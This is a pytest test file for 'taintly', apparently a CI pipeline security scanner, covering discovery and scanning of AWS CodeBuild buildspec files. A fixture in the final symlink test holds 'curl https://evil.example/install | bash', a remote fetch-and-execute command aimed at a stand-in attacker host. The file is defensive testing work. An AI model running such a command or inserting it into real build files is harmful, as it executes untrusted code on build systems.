"""End-to-end contracts for AWS CodeBuild discovery and CLI scanning."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

import taintly.engine as engine_module
from taintly.engine import discover_files, scan_repo
from taintly.models import Platform
from taintly.rules.registry import load_all_rules


def _buildspec(*commands: str) -> str:
    command_lines = "\n".join(f"      - {command}" for command in commands or ("echo ok",))
    return f"version: 0.2\nphases:\n  build:\n    commands:\n{command_lines}\n"


def _codebuild_rules():
    return [rule for rule in load_all_rules() if rule.platform == Platform.CODEBUILD]


def _run_cli(path: Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [
            sys.executable,
            "-m",
            "taintly",
            str(path),
            "--platform",
            "codebuild",
            "--format",
            "json",
            "--no-color",
        ],
        cwd=Path(__file__).parents[2],
        text=True,
        capture_output=True,
        check=False,
    )


def test_scan_repo_discovers_content_shaped_buildspec_names(tmp_path: Path) -> None:
    paths = [
        tmp_path / "buildspec.yml",
        tmp_path / "nested" / "buildspec.yaml",
        tmp_path / "services" / "api" / "buildspec-prod.yml",
        tmp_path / "services" / "worker" / "buildspec_ci.yaml",
        tmp_path / "pipelines" / "release-policy.yaml",
    ]
    for path in paths:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(_buildspec(), encoding="utf-8")

    discovered = discover_files(str(tmp_path), Platform.CODEBUILD)
    report = scan_repo(str(tmp_path), _codebuild_rules(), Platform.CODEBUILD)[0]

    assert {Path(path) for path in discovered} == set(paths)
    assert report.platform == "codebuild"
    assert report.files_scanned == 5
    assert report.rules_loaded == 9


def test_explicit_custom_buildspec_is_scanned_by_engine_and_cli(tmp_path: Path) -> None:
    custom = tmp_path / "pipelines" / "release-policy.yaml"
    custom.parent.mkdir()
    custom.write_text(
        "version: 0.2\nphases:\n  install:\n    runtime-versions:\n      python: latest\n",
        encoding="utf-8",
    )

    report = scan_repo(str(custom), _codebuild_rules(), Platform.CODEBUILD)[0]
    result = _run_cli(custom)
    payload = json.loads(result.stdout)

    assert report.files_scanned == 1
    assert "SEC3-CB-002" in {finding.rule_id for finding in report.findings}
    assert result.returncode == 0, result.stderr
    assert payload["platform"] == "codebuild"
    assert payload["files_scanned"] == 1
    assert "SEC3-CB-002" in {finding["rule_id"] for finding in payload["findings"]}


def test_version_01_is_admitted_but_versionless_buildspec_shape_is_rejected(
    tmp_path: Path,
) -> None:
    version_01 = tmp_path / "buildspec-legacy.yml"
    version_01.write_text(
        "version: 0.1\nphases:\n  build:\n    commands:\n      - echo legacy\n",
        encoding="utf-8",
    )
    versionless = tmp_path / "buildspec-versionless.yml"
    versionless.write_text(
        "phases:\n  build:\n    commands:\n      - echo undocumented\n",
        encoding="utf-8",
    )

    assert discover_files(str(tmp_path), Platform.CODEBUILD) == [str(version_01)]
    versionless_report = scan_repo(str(versionless), _codebuild_rules(), Platform.CODEBUILD)[0]

    assert versionless_report.files_scanned == 0


def test_buildspec_content_gate_rejects_unrelated_yaml_for_auto_and_explicit_scan(
    tmp_path: Path,
) -> None:
    conventional = tmp_path / "buildspec.yml"
    conventional.write_text(
        "version: 1\nservices:\n  web:\n    image: example:v1\n", encoding="utf-8"
    )
    custom = tmp_path / "custom.yaml"
    custom.write_text("version: 0.2\napplication:\n  name: demo\n", encoding="utf-8")

    assert discover_files(str(tmp_path), Platform.CODEBUILD) == []
    report = scan_repo(str(custom), _codebuild_rules(), Platform.CODEBUILD)[0]
    result = _run_cli(custom)
    payload = json.loads(result.stdout)

    assert report.files_scanned == 0
    assert result.returncode == 0, result.stderr
    assert payload["platform"] == "codebuild"
    assert payload["files_scanned"] == 0


def test_mixed_repository_scans_github_and_codebuild(tmp_path: Path) -> None:
    workflow = tmp_path / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text("name: CI\non:\n  push:\njobs: {}\n", encoding="utf-8")
    (tmp_path / "buildspec.yml").write_text(_buildspec(), encoding="utf-8")

    reports = scan_repo(str(tmp_path), load_all_rules())

    assert {report.platform for report in reports} == {"github", "codebuild"}
    assert all(report.files_scanned == 1 for report in reports)


def test_explicit_codebuild_zero_file_report_is_stable_in_engine_and_cli(tmp_path: Path) -> None:
    report = scan_repo(str(tmp_path), _codebuild_rules(), Platform.CODEBUILD)[0]
    result = _run_cli(tmp_path)
    payload = json.loads(result.stdout)

    assert report.platform == "codebuild"
    assert report.files_scanned == 0
    assert report.rules_loaded == 9
    assert result.returncode == 0, result.stderr
    assert payload["platform"] == "codebuild"
    assert payload["files_scanned"] == 0
    assert payload["findings"] == []


def test_fix_dry_run_auto_discovers_codebuild(tmp_path: Path) -> None:
    buildspec = tmp_path / "buildspec.yml"
    buildspec.write_text(_buildspec("npm install"), encoding="utf-8")

    result = subprocess.run(
        [
            sys.executable,
            "-m",
            "taintly",
            str(tmp_path),
            "--fix-dry-run",
            "--fix-npm-ignore-scripts",
            "--no-color",
        ],
        cwd=Path(__file__).parents[2],
        text=True,
        capture_output=True,
        check=False,
    )

    assert result.returncode == 0, result.stderr
    assert "buildspec.yml" in result.stdout
    assert "--ignore-scripts" in result.stdout
    assert "permissions:" not in result.stdout


def test_codebuild_discovery_excludes_symlinked_file_outside_repo(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    outside = tmp_path / "outside" / "buildspec.yml"
    repo.mkdir()
    outside.parent.mkdir()
    outside.write_text(_buildspec("npm install"), encoding="utf-8")
    link = repo / "buildspec.yml"
    try:
        os.symlink(outside, link)
    except OSError as exc:
        pytest.skip(f"symlink creation is unavailable: {exc}")

    discovered = discover_files(str(repo), Platform.CODEBUILD)
    report = scan_repo(str(repo), _codebuild_rules(), Platform.CODEBUILD)[0]

    assert discovered == []
    assert report.files_scanned == 0
    assert report.findings == []


def test_explicit_codebuild_symlink_outside_repo_is_never_read(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = tmp_path / "repo"
    outside = tmp_path / "outside" / "buildspec.yml"
    repo.mkdir()
    outside.parent.mkdir()
    outside.write_text(_buildspec("curl https://evil.example/install | bash"), encoding="utf-8")
    link = repo / "buildspec.yml"
    try:
        os.symlink(outside, link)
    except OSError as exc:
        pytest.skip(f"symlink creation is unavailable: {exc}")

    original_read = engine_module._read_text_head

    def reject_outside_read(path: str, limit: int = 200_000) -> str:
        if Path(path).resolve() == outside.resolve():
            pytest.fail("explicit-file platform matching read outside repository bytes")
        return original_read(path, limit)

    monkeypatch.setattr(engine_module, "_read_text_head", reject_outside_read)
    report = scan_repo(str(link), _codebuild_rules(), Platform.CODEBUILD)[0]

    assert report.files_scanned == 0
    assert report.findings == []
